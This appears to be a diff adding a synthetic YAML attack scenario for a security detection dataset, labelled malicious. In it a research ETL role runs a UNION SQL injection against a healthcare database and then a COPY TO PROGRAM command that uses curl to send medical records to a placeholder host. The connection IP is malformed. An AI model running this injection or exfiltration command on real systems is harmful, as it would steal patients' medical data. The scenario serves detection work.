@@ -1,0 +1,33 @@
+scenario_id: gen_healthcare_39_sql_injection_mal_1075m
+family_id: gen_healthcare_39_sql_injection_fam_1075
+domain: healthcare
+time_of_day: 03:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 3.0
+  events:
+  - step_id: probe
+    sql: SELECT invoice_id, payment_status FROM billing WHERE patient_id = 0 UNION
+      SELECT diagnosis_notes, diagnosis_code FROM medical_records
+  - step_id: exfil
+    sql: COPY (SELECT diagnosis_notes, diagnosis_code FROM medical_records) TO PROGRAM
+      'curl -sX POST https://analytics-mirror.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 193.42.33.8.161
+      port: 9001
+matched_pair_id: gen_healthcare_39_sql_injection_pair_1075
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
